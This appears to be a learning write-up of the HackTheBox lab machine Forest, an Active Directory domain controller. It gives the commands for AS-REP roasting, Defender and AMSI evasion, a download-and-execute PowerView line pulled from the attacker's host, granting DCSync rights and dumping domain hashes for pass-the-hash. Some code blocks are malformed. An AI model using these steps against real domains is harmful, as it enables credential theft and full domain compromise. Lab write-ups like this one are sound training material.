Forest is an easy rated retired box on the HacktheBox platform. I've been trying to learn as much as I can on the windows AD side of things so I'll be doing a couple of these. It can be found [here.](https://app.hackthebox.com/machines/Forest) According to synopsis:

>*"Forest in an easy difficulty Windows Domain Controller (DC), for a domain in which Exchange Server has been installed. The DC is found to allow anonymous LDAP binds, which is used to enumerate domain objects. The password for a service account with Kerberos pre-authentication disabled can be cracked to gain a foothold. The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes."*

<h2> Enumeration</h2>

<h4>What is the scan telling us?</h4>

- The important parts are that there is a domain htb.local, which means this machine is a domain controller. 
- We see the usual AD services present, similar to [return](https://moseskonsue.github.io/study/return/).
- LDAP is present on port 389 so we should use `ldapsearch` to try and bind to it anonymously. We use `ldapsearch -h 10.10.10.161 -p 389 -x -b "dc=htb,dc=local"` to do an anonymous authentication request. 


<h4>What is LDAP binding?</h4>

According to [ldap.com](https://ldap.com/the-ldap-bind-operation/), bind operations are used to authenticate clients to the directory server. This will establish that your identity is authorized to perform subsequent operations processed on that connection. 

<h2>Foothold</h2>

<img src="/assets/images/forest/forest1.PNG" alt="Result of running ldapsearch.">

We obtain ALOT of information from this search request, indicating that null bind is enabled. From here, I consult the official writeup to understand where to go next. The writeup suggests using the [`windapsearch`](https://github.com/ropnop/windapsearch) tool but I didn't have much luck getting it to find the domain on the IP. But I was trying to use the go version so that might have been the issue. 

Other writeups point me towards using [rpcclient.](https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/), which we can use various commands with to enumerate the domain. Firstly, the users:

```bash
└─$ rpcclient -U "" -N 10.10.10.161
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]

Then the groups:

```

From here we can find the members of the domain admins group which is `rid:[0x200]`:

```bash

        rid:[0x1f4] attr:[0x7]

Apparently the account that I am supposed to be most interested in is `svc-alfresco` which is running an [Alfresco](https://docs.alfresco.com/process-services/latest/config/authenticate/) service. Importantly the documentation for the account specifies that the account requires Kerberos pre-authentication to be disabled. This is important because it means we can request the ["Ticket Granting Ticket"(TGT)](https://doubleoctopus.com/security-wiki/authentication/ticket-granting-tickets/) for this account. This is what we are going to crack, as the TGT is encrypted with the user's New Technology LAN Manager(NTLM) hash. Once we obtain this hash we can bruteforce it offline to get the svc account password. 

The writeup states that we can use impacket's [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) to request a TGT ticket and dump the hash. 

<img src="/assets/images/forest/forest2.PNG" alt="Impacket gets it done again.">

From here we can use `john` to crack the hash with the trusty `rockyou.txt` wordlist:

<img src="/assets/images/forest/forest3.PNG" alt="Nice password.">

We find that the password is `s3rvice`, just like last box we will try to login over WinRM on port 5985 with `Evil-WinRM`.

<img src="/assets/images/forest/forest4.PNG" alt="whoami.">

And then of course!

<h2>Privilege Escalation</h2>

Domains are messy. We need a tool to help us visualize what the hell is going on in here and what things lead to what in terms of lateral and escalating movement. Luckily [Bloodhound](https://github.com/BloodHoundAD/BloodHound) exists, and I can stand on the shoulders of hard working individuals. 

First we need to collect the information the bloodhound will parse and output for us. We can do this with `pip install bloodhound`, which will install `bloodhound-python`. We can run `bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -gc forest.htb.local -c all -ns 10.10.10.161`

<h4>What is the forest?</h4>

The website [itbros](https://theitbros.com/global-catalog-active-directory/) explains the forest in relation to a global catalog(gc) and domain model as as:

>*"A Global Catalog server is a domain controller that stores copies of all Active Directory objects in the forest. It stores a complete copy of all objects in the directory of your domain and a partial copy of all objects of all other forest domains. Thus, the Global Catalog allows users and applications to find objects in any domain of the current forest by searching for attributes included to GC.
A typical domain controller stores a complete replica of objects in its own domain, but not for other domains in the forest."*

This is explained further through Microsoft's own [documentation](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model):

>*"In the organizational domain forest model, several autonomous groups each own a domain within a forest. Each group controls domain-level service administration, which enables them to manage certain aspects of service management autonomously while the forest owner controls forest-level service management."*

From here we can upload the `.json` files produced by `bloodhound-python` to bloodhound through the GUI. From here we search for the account we have owned `svc-alfresco`, right click the node and mark the account as owned. We read through the information for the user and see that it is a member of 9 groups, we double click this to visualize the relationships. 

<img src="/assets/images/forest/forest6.PNG" alt="Bloodhound group relationships for the owned account.">

We see that `svc-alfresco` is a member of [`Account Operators`](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-accountoperators) which is a privileged AD group that can create, modify and add users to non-protected group.   

<img src="/assets/images/forest/forest7.PNG" alt="Shortest path to privileged acounts.">

Unlike all the writeups, I do not seem to have a clear path to Domain admins from `svc-alfresco` in bloodhound. I have searched for the reasoning for a few hours, and from what I see my Bloodhound has not marked `HTB.LOCAL` as a node. That should be something to look up. 

<img src="/assets/images/forest/forest8.PNG" alt="What we should see.">

That is the path we should see!, credits to [ir0nstone](https://ir0nstone-ad.notion.site/ir0nstone-ad/Forest-aef04d15fa1a48248ac3e94aa440d2c4) for the image. We see that `EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL` has `WriteDacl` privileges on Domain. Meaning that the user can write to the discretionary access control list(DACL) of the Domain. Meaning we can add a user to `EXCHANGE WINDOWS PERMISSIONS` group and give them `DCSync` privileges. [DCSYNC](https://stealthbits.com/blog/what-is-dcsync-an-introduction/) privilege allows an attacker to simulate a Domain Controller to retrieve password hashes via domain replication. Requesting a "sync" that will contain password hashes that should only be viewable by Domain Controller.   

So we should abuse the group privileges that this user has like so:

<img src="/assets/images/forest/forest9.PNG" alt="Adding evil.">

We have created a new user called `evil` with the password `Nice1234!` to comply with the domain's password policy. And we have added this user to various groups which are on the path to domain admin as seen in ir0nstone's image. From here we grab [Powerview](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1) and use `evil-winrm` to evade defender by patching our session with `Bypass-4msi` like so:

<img src="/assets/images/forest/forest10.PNG" alt="Bypass-4msi.">

We can then upload `PowerView.ps1` by starting an http server on our box with `sudo python3 -m http.server` then running `iex(new-object net.webclient).downloadstring('http://10.10.14.11:8000/PowerView.ps1')` on the `evil-winrm` session to download from our box. From here we can use the `evil-winrm` shell to run `Add-objectACl` which gives our account `evil` DCSync privilege. These can be pasted one line after each other.
```
$pass = convertto-securestring 'Nice1234!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('HTB\evil', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb, DC=local" -PrincipalIdentity evil -Rights DCSync
```

Once this is completed we can use another Impacket script, [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) to dump all the domain hashes using our newly privileged user `evil`:

<img src="/assets/images/forest/forest11.PNG" alt="Dump it all!">

Now we have the Administrator hash we can use ANOTHER impacket script, [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) to simulate psexec on linux and the hash we obtained with `-hashes`:

<img src="/assets/images/forest/forest12.PNG" alt="SYSTEM">

We navigate to the usual administrator desktop and there is the `root.txt`!

<img src="/assets/images/forest/forest13.PNG" alt="Victory!">

<h4>For next time:</h4>

- When enumerating for user to exploit on domain you should check which `svc` accounts exist and what permissions they have. 
- Pay attention to / or \, that cost 30 minutes.
- You can right click on a path in Bloodhound and click `help` for suggestions on how to escalate or move.
